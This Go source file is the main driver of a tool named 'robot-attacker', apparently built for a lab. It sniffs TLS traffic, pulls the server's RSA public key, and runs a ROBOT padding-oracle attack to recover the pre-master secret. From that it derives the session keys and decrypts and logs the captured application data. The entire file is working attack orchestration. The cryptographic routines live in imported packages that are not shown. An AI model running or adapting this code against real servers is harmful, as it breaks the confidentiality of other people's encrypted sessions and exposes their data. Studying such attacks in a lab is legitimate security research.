package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"robot-attacker/core"
	"robot-attacker/crypto"
	"robot-attacker/middleware"
	"time"
)

func main() {
	// Initialize global application configuration
	core.LoadConfig()
	attackerConfig := core.Config
	sessionLogger := middleware.NewSessionLogger("captures")

	// Monitor network for traffic
	networkSniffer := middleware.NewSniffer(5 * time.Second)
	networkSniffer.Start()
	fmt.Println("[ATTACK] Sniffer active. Waiting for silence...")

	// Extract target public key
	serverPublicKey, err := middleware.FetchServerPublicKey(attackerConfig.TargetURL())
	if err != nil {
		log.Fatalf("FAILED reconnaissance: %v", err)
	}

	<-networkSniffer.SignalDone
	capturedPackets := networkSniffer.CapturedPackets

	// Parse intercepted network data
	sessionLogger.LogTraffic(capturedPackets, "traffic_encrypted.log", false)
	sessionCiphertext := middleware.ExtractCiphertext(capturedPackets)
	if sessionCiphertext == nil {
		log.Fatalf("FAILED: Missing ClientKeyExchange")
	}

	// Extract Handshake Randoms
	cRandom, sRandom := middleware.ExtractHandshakeRandoms(capturedPackets)
	if cRandom == nil || sRandom == nil {
		log.Fatalf("FAILED: Missing Handshake Randoms")
	}

	// Execute ROBOT session attack
	fmt.Println("[ATTACK] Recovering Pre-Master Secret (PMS)...")
	startTime := time.Now()
	pmsBigInt := crypto.ExecuteAttack(attackerConfig, serverPublicKey, sessionCiphertext)
	duration := time.Since(startTime)

	// Report final attack results
	if pmsBigInt != nil {
		fmt.Println("\n--- ATTACK CONVERGED ---")
		fmt.Printf("Total Oracle Queries: %d\n", core.TotalQueries)
		fmt.Printf("Total Time to Convergence: %v\n", duration.Round(time.Millisecond))
		fmt.Printf("Target Key Size: RSA %d-bit (Laboratory Optimized)\n", serverPublicKey.N.BitLen())
		
		keySize := (serverPublicKey.N.BitLen() + 7) / 8
		paddedBytes := make([]byte, keySize)
		pmsBigInt.FillBytes(paddedBytes)
		
		// The PMS is the last 48 bytes
		pmsBytes := paddedBytes[len(paddedBytes)-48:]
		
		// Real Key Derivation
		ms := crypto.DeriveMasterSecret(pmsBytes, cRandom, sRandom)
		keys := crypto.DeriveSessionKeys(ms, cRandom, sRandom)

		fmt.Println("\n--- RECOVERED SECRETS ---")
		fmt.Printf("Recovered Pre-Master Secret (PMS): %x\n", pmsBytes)
		fmt.Printf("Derived Master Secret:              %x\n", ms)
		fmt.Printf("Derived AES Key (Client):           %x\n", keys.ClientWriteKey)

		fmt.Println("\n--- DECRYPTED APPLICATION DATA ---")

		// Perform mathematical decryption of all AppData
		for i := range capturedPackets {
			if capturedPackets[i].Type == "AppData" {
				ciphertext, _ := hex.DecodeString(capturedPackets[i].Data)
				
				// Directional key selection
				key := keys.ClientWriteKey
				if capturedPackets[i].Source == "172.20.0.2:8443" {
					key = keys.ServerWriteKey
				}
				
				decrypted, err := crypto.DecryptAESCBC(key, ciphertext)
				if err == nil {
					capturedPackets[i].Plaintext = string(decrypted)
					fmt.Printf("[%s -> %s] Decrypted: %s\n", capturedPackets[i].Source, capturedPackets[i].Dest, string(decrypted))
				} else {
					capturedPackets[i].Plaintext = "[DECRYPTION_FAILED: " + err.Error() + "]"
				}
			}
		}

		sessionLogger.LogTraffic(capturedPackets, "traffic_decrypted.log", true)
		fmt.Printf("\n[ATTACK] Success. Results saved: %s\n", sessionLogger.SessionPath())
	} else {
		fmt.Println("[ATTACK] Failed to converge after maximum iterations.")
	}
}

